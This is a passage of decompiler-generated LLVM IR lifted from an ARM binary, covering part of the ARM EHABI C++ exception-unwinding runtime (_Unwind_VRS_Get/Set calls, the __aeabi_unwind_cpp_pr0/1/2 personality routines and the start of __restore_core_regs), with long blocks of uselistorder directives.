  %v1_19bd8 = load i32, i32* @sl, align 4
  %v9_19bd8 = icmp eq i32 %v0_19b90, %v1_19bd8
  br i1 %v9_19bd8, label %dec_label_pc_19dc8, label %dec_label_pc_19be0

dec_label_pc_19be0:                               ; preds = %dec_label_pc_19bd8
  %v0_19be0 = load i32, i32* @r7, align 4
  %v1_19be0 = inttoptr i32 %v0_19be0 to i32*
  %v2_19be0 = load i32, i32* %v1_19be0, align 4
  %v1_19be4 = icmp slt i32 %v2_19be0, 0
  %v0_19bec.pre = load i32, i32* @r6, align 4
  br i1 %v1_19be4, label %dec_label_pc_19bec, label %dec_label_pc_19cac

dec_label_pc_19bec:                               ; preds = %dec_label_pc_19be0, %dec_label_pc_19ca4
  %v0_19bec = phi i32 [ %storemerge, %dec_label_pc_19ca4 ], [ %v0_19bec.pre, %dec_label_pc_19be0 ]
  store i32 %v0_19bec, i32* %r0.global-to-local, align 4
  %v1_19bf0 = add i32 %v0_19bec, 4
  store i32 %v1_19bf0, i32* @r6, align 4
  br label %dec_label_pc_19cac

dec_label_pc_19bf8:                               ; preds = %bb154
  store i32 %v1_19978, i32* %r2.global-to-local, align 4
  br i1 %v2_19a74, label %dec_label_pc_19c04, label %dec_label_pc_19cf0

dec_label_pc_19c04:                               ; preds = %dec_label_pc_19bf8
  %v2_19c04 = icmp eq i32 %v0_19c04, 0
  br i1 %v2_19c04, label %dec_label_pc_19c70, label %dec_label_pc_19c0c

dec_label_pc_19c0c:                               ; preds = %dec_label_pc_19c04
  %v0_19c0c = load i32, i32* @r7, align 4
  %v1_19c0c = add i32 %v0_19c0c, 4
  %v2_19c0c = inttoptr i32 %v1_19c0c to i32*
  %v3_19c0c = load i32, i32* %v2_19c0c, align 4
  %v7_19c10 = icmp eq i32 %v3_19c0c, -2
  store i32 %v1_19c0c, i32* %r2.global-to-local, align 4
  br i1 %v7_19c10, label %dec_label_pc_19b28, label %dec_label_pc_19c1c

dec_label_pc_19c1c:                               ; preds = %dec_label_pc_19c0c
  %v0_19c1c = load i32, i32* @r8, align 4
  %v1_19c1c = add i32 %v0_19c1c, 88
  %v7_19c20 = icmp eq i32 %v3_19c0c, -1
  store i32 %v1_19c1c, i32* %forced_unwind_-44, align 4
  br i1 %v7_19c20, label %dec_label_pc_19c64, label %dec_label_pc_19c2c

dec_label_pc_19c2c:                               ; preds = %dec_label_pc_19c1c
  %v2_19c30 = icmp eq i32 %v3_19c0c, 0
  br i1 %v2_19c30, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_19c2c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_19c2c, %bb162
  store i32 %v0_19c1c, i32* %r0.global-to-local, align 4
  store i32 %v2_19c40, i32* %r2.global-to-local, align 4
  %v4_19c4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 100) to i32*), align 4
  store i32 105560, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19c4c)
  %v0_19c58 = load i32, i32* %r0.global-to-local, align 4
  %v2_19c58 = icmp eq i32 %v0_19c58, 0
  br i1 %v2_19c58, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_19c64.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19c64

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_19c70

dec_label_pc_19c64:                               ; preds = %.thread25, %dec_label_pc_19c1c
  %v3_19c64 = phi i32 [ %v3_19c64.pr, %.thread25 ], [ %v1_19c1c, %dec_label_pc_19c1c ]
  %v2_19c68 = icmp eq i32 %v3_19c64, 0
  br i1 %v2_19c68, label %dec_label_pc_19c70, label %dec_label_pc_19dc8

dec_label_pc_19c70:                               ; preds = %bb164, %dec_label_pc_19d1c, %dec_label_pc_19cf0, %dec_label_pc_19c64, %dec_label_pc_19c04
  %v0_19c70 = load i32, i32* @r7, align 4
  %v1_19c70 = add i32 %v0_19c70, 8
  %v1_199d8 = inttoptr i32 %v1_19c70 to i32*
  %v2_199d8 = load i32, i32* %v1_199d8, align 4
  %v2_199dc = icmp eq i32 %v2_199d8, 0
  br i1 %v2_199dc, label %dec_label_pc_19a98, label %dec_label_pc_199e4.preheader

dec_label_pc_19c78:                               ; preds = %entry
  %v3_19c78 = udiv i32 %v2_1996c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_19c88 = mul nuw nsw i32 %v3_19c78, 4
  %v3_19c8c = mul i32 %v2_1996c, 65536
  %v2_19c90 = add i32 %v6_19c88, %v4_1996c
  store i32 %v3_19c8c, i32* %v4_1998c, align 8
  br label %dec_label_pc_199b4

dec_label_pc_19ca0:                               ; preds = %bb159, %dec_label_pc_19b4c
  %v1_19ca0 = add i32 %v0_19b3c, 4
  br label %dec_label_pc_19ca4

dec_label_pc_19ca4:                               ; preds = %dec_label_pc_19ce4, %dec_label_pc_19ca0
  %v0_19ca4 = phi i32 [ %v2_19ce4, %dec_label_pc_19ce4 ], [ %v2_19b3c, %dec_label_pc_19ca0 ]
  %storemerge = phi i32 [ %v4_19ce4, %dec_label_pc_19ce4 ], [ %v1_19ca0, %dec_label_pc_19ca0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_19ca4 = icmp slt i32 %v0_19ca4, 0
  br i1 %v1_19ca4, label %dec_label_pc_19bec, label %dec_label_pc_19cac

dec_label_pc_19cac:                               ; preds = %dec_label_pc_19be0, %dec_label_pc_19ca4, %dec_label_pc_19db8, %dec_label_pc_19bec
  %v0_19cb0 = phi i32 [ %v1_19bf0, %dec_label_pc_19bec ], [ %storemerge, %dec_label_pc_19ca4 ], [ %v1_19dbc, %dec_label_pc_19db8 ], [ %v0_19bec.pre, %dec_label_pc_19be0 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_19bec ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19ca4 ], [ %v1_19db8, %dec_label_pc_19db8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19be0 ]
  %v0_19cac = load i32, i32* @sl, align 4
  %v3_19cac = mul i32 %v0_19cac, 4
  %v2_19cb0 = add i32 %v3_19cac, %v0_19cb0
  %v1_199d865 = inttoptr i32 %v2_19cb0 to i32*
  %v2_199d866 = load i32, i32* %v1_199d865, align 4
  %v2_199dc68 = icmp eq i32 %v2_199d866, 0
  br i1 %v2_199dc68, label %dec_label_pc_19a98, label %dec_label_pc_199e4.preheader.lr.ph

dec_label_pc_19cb8:                               ; preds = %dec_label_pc_19b38
  %v0_19cc8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19cc8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19cd0 = load i32, i32* @r8, align 4
  %v1_19cd0 = add i32 %v0_19cd0, 32
  %v2_19cd0 = inttoptr i32 %v1_19cd0 to i32*
  %v3_19cd0 = load i32, i32* %v2_19cd0, align 4
  store i32 %v3_19cd0, i32* @r4, align 4
  %v5_19cd4 = call i32 @_Unwind_VRS_Get(i32 %v0_19cc8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19cd4, i32* %r0.global-to-local, align 4
  %v3_19cd8 = load i32, i32* %stack_var_-48, align 4
  %v0_19cdc = load i32, i32* @r4, align 4
  %v9_19cdc = icmp eq i32 %v0_19cdc, %v3_19cd8
  br i1 %v9_19cdc, label %dec_label_pc_19d84, label %dec_label_pc_19cb8.dec_label_pc_19ce4_crit_edge

dec_label_pc_19cb8.dec_label_pc_19ce4_crit_edge:  ; preds = %dec_label_pc_19cb8
  %v0_19ce4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19ce4

dec_label_pc_19ce4:                               ; preds = %dec_label_pc_19cb8.dec_label_pc_19ce4_crit_edge, %dec_label_pc_19d84
  %v0_19ce4 = phi i32 [ %v0_19ce4.pre, %dec_label_pc_19cb8.dec_label_pc_19ce4_crit_edge ], [ %v1_19d88, %dec_label_pc_19d84 ]
  %v1_19ce4 = inttoptr i32 %v0_19ce4 to i32*
  %v2_19ce4 = load i32, i32* %v1_19ce4, align 4
  %v4_19ce4 = add i32 %v0_19ce4, 4
  store i32 %v4_19ce4, i32* @r7, align 4
  br label %dec_label_pc_19ca4

dec_label_pc_19cf0:                               ; preds = %dec_label_pc_19bf8
  %v0_19d00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19d00, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19d08 = load i32, i32* @r8, align 4
  %v1_19d08 = add i32 %v0_19d08, 32
  %v2_19d08 = inttoptr i32 %v1_19d08 to i32*
  %v3_19d08 = load i32, i32* %v2_19d08, align 4
  store i32 %v3_19d08, i32* @r4, align 4
  %v5_19d0c = call i32 @_Unwind_VRS_Get(i32 %v0_19d00, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19d0c, i32* %r0.global-to-local, align 4
  %v3_19d10 = load i32, i32* %stack_var_-48, align 4
  %v0_19d14 = load i32, i32* @r4, align 4
  %v9_19d14 = icmp eq i32 %v0_19d14, %v3_19d10
  br i1 %v9_19d14, label %dec_label_pc_19d1c, label %dec_label_pc_19c70

dec_label_pc_19d1c:                               ; preds = %dec_label_pc_19cf0
  %v0_19d1c = load i32, i32* @r8, align 4
  %v1_19d1c = add i32 %v0_19d1c, 40
  %v2_19d1c = inttoptr i32 %v1_19d1c to i32*
  %v3_19d1c = load i32, i32* %v2_19d1c, align 4
  %v1_19d20 = load i32, i32* @r7, align 4
  %v9_19d20 = icmp eq i32 %v3_19d1c, %v1_19d20
  br i1 %v9_19d20, label %dec_label_pc_19d28, label %dec_label_pc_19c70

dec_label_pc_19d28:                               ; preds = %dec_label_pc_19d1c
  %v1_19d28 = inttoptr i32 %v3_19d1c to i32*
  %v2_19d28 = load i32, i32* %v1_19d28, align 4
  %v1_19d2c = and i32 %v2_19d28, 1073741824
  %v2_19d2c = icmp eq i32 %v1_19d2c, 0
  br i1 %v2_19d2c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19d28
  %v2_19d30 = or i32 %v2_19d28, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19d28
  %tmp208 = bitcast i32 %v2_19d28 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_19d34 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_19d38 = phi i32 [ %v2_19e68, %.thread28 ], [ %v2_19e68, %bb169 ], [ %v3_19d1c, %bb165 ], [ %v3_19d1c, %.thread26 ]
  %v0_19d38 = phi i32 [ %v2_19e78, %.thread28 ], [ %v2_19e74, %bb169 ], [ %v2_19d30, %bb165 ], [ %v2_19d34, %.thread26 ]
  %v2_19d38 = add i32 %v0_19d38, %v1_19d38
  store i32 %v2_19d38, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19d50 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19d50, i32* %r0.global-to-local, align 4
  %v5_19d58 = call i32 @_Unwind_VRS_Set(i32 %v0_19d50, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_19d50, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19d70 = load i32, i32* @r8, align 4
  store i32 %v0_19d70, i32* %stack_var_-48, align 4
  %v5_19d78 = call i32 @_Unwind_VRS_Set(i32 %v0_19d50, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b2c

dec_label_pc_19d84:                               ; preds = %dec_label_pc_19cb8
  %v0_19d84 = load i32, i32* @r8, align 4
  %v1_19d84 = add i32 %v0_19d84, 40
  %v2_19d84 = inttoptr i32 %v1_19d84 to i32*
  %v3_19d84 = load i32, i32* %v2_19d84, align 4
  %v1_19d88 = load i32, i32* @r7, align 4
  %v9_19d88 = icmp eq i32 %v3_19d84, %v1_19d88
  br i1 %v9_19d88, label %dec_label_pc_19d90, label %dec_label_pc_19ce4

dec_label_pc_19d90:                               ; preds = %dec_label_pc_19d84
  %v1_19d94 = add i32 %v3_19d84, 4
  store i32 %v1_19d94, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_19d9c = add i32 %v0_19d84, 44
  %v3_19d9c = inttoptr i32 %v2_19d9c to i32*
  store i32 0, i32* %v3_19d9c, align 4
  %v0_19da0 = load i32, i32* %r2.global-to-local, align 4
  %v1_19da0 = load i32, i32* @r8, align 4
  %v2_19da0 = add i32 %v1_19da0, 48
  %v3_19da0 = inttoptr i32 %v2_19da0 to i32*
  store i32 %v0_19da0, i32* %v3_19da0, align 4
  %v0_19da4 = load i32, i32* @sl, align 4
  %v1_19da4 = load i32, i32* @r8, align 4
  %v2_19da4 = add i32 %v1_19da4, 40
  %v3_19da4 = inttoptr i32 %v2_19da4 to i32*
  store i32 %v0_19da4, i32* %v3_19da4, align 4
  %v0_19da8 = load i32, i32* %r0.global-to-local, align 4
  %v1_19da8 = load i32, i32* @r8, align 4
  %v2_19da8 = add i32 %v1_19da8, 52
  %v3_19da8 = inttoptr i32 %v2_19da8 to i32*
  store i32 %v0_19da8, i32* %v3_19da8, align 4
  %v0_19dac = load i32, i32* @r7, align 4
  %v1_19dac = inttoptr i32 %v0_19dac to i32*
  %v2_19dac = load i32, i32* %v1_19dac, align 4
  %v1_19db0 = icmp slt i32 %v2_19dac, 0
  br i1 %v1_19db0, label %dec_label_pc_19db8, label %dec_label_pc_19e64

dec_label_pc_19db8:                               ; preds = %dec_label_pc_19d90
  %v0_19db8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19db8 = add i32 %v0_19db8, -3
  store i32 %v1_19db8, i32* %r2.global-to-local, align 4
  %v0_19dbc = load i32, i32* %r0.global-to-local, align 4
  %v1_19dbc = add i32 %v0_19dbc, 4
  store i32 %v1_19dbc, i32* @r6, align 4
  br label %dec_label_pc_19cac

dec_label_pc_19dc8:                               ; preds = %dec_label_pc_19bd8, %dec_label_pc_19c64, %dec_label_pc_19b90, %dec_label_pc_19b64.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19dd8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19dd8, i32* %r0.global-to-local, align 4
  %v5_19de0 = call i32 @_Unwind_VRS_Get(i32 %v0_19dd8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19de4 = load i32, i32* @r7, align 4
  %v1_19de4 = load i32, i32* @r8, align 4
  %v2_19de4 = add i32 %v1_19de4, 40
  %v3_19de4 = inttoptr i32 %v2_19de4 to i32*
  store i32 %v0_19de4, i32* %v3_19de4, align 4
  %v3_19de8 = load i32, i32* %stack_var_-48, align 4
  %v3_19dec = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_19dec, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19df4 = load i32, i32* @r8, align 4
  %v2_19df4 = add i32 %v1_19df4, 32
  %v3_19df4 = inttoptr i32 %v2_19df4 to i32*
  store i32 %v3_19de8, i32* %v3_19df4, align 4
  %v0_19df8 = load i32, i32* %r2.global-to-local, align 4
  %v1_19df8 = load i32, i32* @r8, align 4
  %v2_19df8 = add i32 %v1_19df8, 36
  %v3_19df8 = inttoptr i32 %v2_19df8 to i32*
  store i32 %v0_19df8, i32* %v3_19df8, align 4
  %v1_19b34.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b2c

dec_label_pc_19e00:                               ; preds = %bb155
  %v1_19e00 = inttoptr i32 %v0_19a88 to i32*
  %v2_19e00 = load i32, i32* %v1_19e00, align 4
  %v1_19e04 = add i32 %v0_19a88, 4
  %v1_19e08 = and i32 %v2_19e00, 1073741824
  %v2_19e08 = icmp eq i32 %v1_19e08, 0
  %v2_19e0c = or i32 %v2_19e00, -2147483648
  %tmp210 = bitcast i32 %v2_19e00 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19e10 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19e08, i32 %v2_19e10, i32 %v2_19e0c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19e14 = load i32, i32* @r8, align 4
  %v2_19e14 = add i32 %v1_19e14, 56
  %v3_19e14 = inttoptr i32 %v2_19e14 to i32*
  store i32 %v1_19e04, i32* %v3_19e14, align 4
  %v0_19e18 = load i32, i32* @r8, align 4
  store i32 %v0_19e18, i32* %r0.global-to-local, align 4
  %v4_19e24 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 28) to i32*), align 4
  store i32 106032, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19e24)
  %v0_19e30 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e30 = icmp eq i32 %v0_19e30, 0
  br i1 %v2_19e30, label %dec_label_pc_19b28, label %dec_label_pc_19e38

dec_label_pc_19e38:                               ; preds = %dec_label_pc_19e00
  %v0_19e38 = load i32, i32* %r4.global-to-local, align 4
  %v1_19e38 = load i32, i32* @r7, align 4
  %v2_19e38 = add i32 %v1_19e38, %v0_19e38
  store i32 %v2_19e38, i32* %stack_var_-48, align 4
  %v0_19e48 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19e48, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_19e58 = call i32 @_Unwind_VRS_Set(i32 %v0_19e48, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b2c

dec_label_pc_19e64:                               ; preds = %dec_label_pc_19d90
  %v0_19e64 = load i32, i32* @sl, align 4
  %v3_19e64 = mul i32 %v0_19e64, 4
  %v0_19e68 = load i32, i32* %r0.global-to-local, align 4
  %v2_19e68 = add i32 %v0_19e68, %v3_19e64
  %v3_19e68 = inttoptr i32 %v2_19e68 to i32*
  %v4_19e68 = load i32, i32* %v3_19e68, align 4
  %v1_19e6c = and i32 %v4_19e68, 1073741824
  %v2_19e6c = icmp eq i32 %v1_19e6c, 0
  br i1 %v2_19e6c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19e64
  %v2_19e74 = or i32 %v4_19e68, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19e64
  %tmp212 = bitcast i32 %v4_19e68 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_19e78 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19e68, { 2, 1, 0 }
  uselistorder i32 %v1_19dbc, { 1, 0 }
  uselistorder i32 %v1_19db8, { 1, 0 }
  uselistorder i32 %v1_19d88, { 1, 0 }
  uselistorder i32 %v0_19d50, { 1, 0, 2, 3 }
  uselistorder i32 %v3_19d1c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19ce4, { 1, 0 }
  uselistorder i32 %v0_19ce4, { 1, 0 }
  uselistorder i32 %v2_199d866, { 1, 0 }
  uselistorder i32 %v2_19cb0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_199d8, { 1, 0 }
  uselistorder i32 %v1_19c70, { 1, 0 }
  uselistorder i32 %v3_19c0c, { 2, 0, 1 }
  uselistorder i32 %v0_19bec, { 1, 0 }
  uselistorder i32 %v0_19bec.pre, { 1, 0 }
  uselistorder i32 %v1_19b44, { 1, 0 }
  uselistorder i32 %v2_19b3c, { 1, 0 }
  uselistorder i32 %v0_19acc, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_19a8c, { 1, 0 }
  uselistorder i32 %v1_19a88, { 1, 0 }
  uselistorder i32 %v0_19a88, { 1, 0, 2 }
  uselistorder i32 %v4_19a60, { 0, 2, 1, 3 }
  uselistorder i32 %v0_19c04, { 1, 2, 0 }
  uselistorder i32 %v0_19a38, { 1, 0 }
  uselistorder i32 %v3_19a34, { 1, 0, 2 }
  uselistorder i32 %v1_19a08, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_19c40, { 1, 0 }
  uselistorder i1 %v2_19a74, { 1, 0, 2 }
  uselistorder i32 %v1_19978, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 78, 0, 15, 16, 77, 17, 37, 38, 18, 36, 4, 39, 19, 40, 1, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 29, 6, 30, 41, 42, 43, 7, 44, 45, 46, 47, 8, 48, 49, 50, 51, 9, 52, 10, 53, 54, 31, 55, 11, 56, 57, 58, 32, 59, 12, 60, 61, 33, 62, 63, 64, 65, 66, 34, 67, 13, 68, 69, 70, 71, 72, 73, 35, 74, 14, 75, 5, 76, 3 }
  uselistorder i32 -3, { 4, 0, 5, 7, 6, 3, 1, 2 }
  uselistorder i32 52, { 27, 1, 2, 4, 13, 14, 10, 11, 12, 15, 17, 16, 5, 20, 21, 3, 22, 0, 23, 24, 6, 7, 18, 19, 8, 25, 9, 26 }
  uselistorder i32 48, { 24, 2, 0, 9, 7, 8, 13, 14, 10, 11, 17, 18, 19, 15, 20, 4, 12, 16, 1, 5, 21, 3, 22, 6, 23 }
  uselistorder i32 44, { 46, 2, 47, 48, 0, 16, 3, 17, 4, 5, 6, 27, 28, 29, 30, 31, 32, 24, 25, 26, 7, 22, 23, 8, 1, 9, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 10, 11, 12, 18, 19, 20, 21, 13, 43, 14, 44, 15, 45 }
  uselistorder i32 -2147483648, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i32 1073741824, { 4, 5, 6, 7, 8, 9, 10, 11, 0, 1, 2, 3 }
  uselistorder i32 65536, { 4, 5, 6, 7, 9, 8, 14, 10, 15, 11, 16, 12, 17, 13, 18, 19, 20, 24, 21, 25, 22, 26, 23, 27, 143, 28, 29, 30, 31, 32, 33, 34, 35, 36, 142, 37, 38, 39, 2, 40, 0, 3, 41, 42, 44, 43, 1, 47, 45, 46, 48, 54, 49, 55, 50, 56, 51, 52, 53, 58, 59, 60, 61, 57, 141, 63, 62, 65, 64, 67, 68, 69, 66, 70, 72, 73, 74, 71, 75, 76, 78, 79, 77, 80, 81, 84, 82, 85, 83, 87, 88, 89, 86, 90, 95, 91, 96, 92, 97, 93, 94, 99, 100, 101, 98, 102, 103, 104, 105, 107, 106, 108, 116, 109, 117, 110, 118, 111, 119, 112, 120, 113, 114, 115, 122, 123, 124, 125, 121, 126, 131, 127, 132, 128, 129, 130, 134, 136, 137, 138, 133, 135, 140, 139 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 100) to i32*), { 1, 0 }
  uselistorder i32 88, { 5, 6, 3, 0, 4, 1, 2 }
  uselistorder i32 100, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_233cc.493 to i32), { 28, 6, 29, 30, 7, 8, 64, 82, 83, 1, 2, 0, 3, 65, 66, 84, 9, 67, 85, 10, 11, 12, 13, 14, 15, 27, 68, 86, 69, 87, 16, 17, 70, 71, 72, 88, 18, 89, 90, 91, 19, 92, 20, 73, 93, 94, 21, 22, 23, 95, 74, 96, 24, 97, 25, 98, 99, 100, 4, 26, 101, 75, 102, 77, 103, 104, 105, 34, 33, 35, 106, 107, 31, 59, 55, 53, 52, 54, 56, 57, 58, 51, 60, 46, 48, 47, 45, 44, 49, 50, 41, 40, 43, 42, 39, 38, 37, 36, 79, 61, 78, 62, 63, 80, 108, 5, 109, 110, 111, 112, 113, 32, 76, 114, 81 }
  uselistorder i32 -2, { 0, 33, 34, 6, 3, 4, 2, 7, 8, 9, 1, 5, 29, 28, 30, 31, 32, 21, 22, 23, 24, 25, 26, 27, 10, 11, 12, 13, 14, 20, 19, 18, 17, 16, 15 }
  uselistorder i32 80, { 15, 16, 17, 1, 3, 2, 4, 5, 6, 12, 7, 8, 11, 9, 10, 13, 0, 14 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_19dc8, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19ce4, { 1, 0 }
  uselistorder label %dec_label_pc_19cac, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_19c70, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_19bec, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_19b2c, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_19b28, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19a88, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_199e4, { 1, 0 }
  uselistorder label %dec_label_pc_199e4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_199e4.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_19e84(i32 %arg1) local_unnamed_addr {
dec_label_pc_19e84:
  %v0_19e84 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19e84, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_19e84
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_19e84, %bb
  %v10_19e8c = phi i32 [ %arg1, %dec_label_pc_19e84 ], [ 0, %bb ]
  ret i32 %v10_19e8c

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 27, 28, 29, 49, 19, 26, 50, 51, 52, 53, 54, 5, 4, 55, 42, 43, 30, 31, 20, 34, 33, 32, 35, 6, 8, 44, 21, 22, 7, 16, 9, 38, 17, 15, 18, 10, 11, 12, 36, 13, 14, 39, 45, 46, 47, 24, 48, 23, 25, 41, 37, 40, 56, 57 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 40, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 38, 39, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19e94 = load i32, i32* @r1, align 4
  %v2_19e94 = load i32, i32* @r2, align 4
  %v4_19e94 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_19e94, i32 %v2_19e94, i32 2)
  ret i32 %v4_19e94
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19e9c = load i32, i32* @r1, align 4
  %v2_19e9c = load i32, i32* @r2, align 4
  %v4_19e9c = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_19e9c, i32 %v2_19e9c, i32 1)
  ret i32 %v4_19e9c
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_19ea4 = load i32, i32* @r1, align 4
  %v2_19ea4 = load i32, i32* @r2, align 4
  %v4_19ea4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_19ea4, i32 %v2_19ea4, i32 0)
  ret i32 %v4_19ea4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 8, 9, 10, 55, 11, 0, 20, 12, 21, 56, 57, 58, 16, 17, 18, 19, 34, 35, 36, 37, 59, 60, 61, 72, 73, 74, 75, 64, 1, 65, 62, 63, 2, 3, 4, 42, 43, 5, 6, 66, 67, 68, 69, 70, 71, 38, 44, 45, 46, 22, 13, 14, 15, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 7, 39, 40, 41, 47, 48, 49, 50, 51, 52, 53, 54 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_19eac = add i32 %tmp, 56
  %v4_19eac = inttoptr i32 %v3_19eac to i32*
  %v5_19eac = load i32, i32* %v4_19eac, align 4
  %v6_19eac = add i32 %tmp, 60
  %v7_19eac = inttoptr i32 %v6_19eac to i32*
  %v8_19eac = load i32, i32* %v7_19eac, align 4
  %v2_19eb8 = load i32, i32* %arg1, align 4
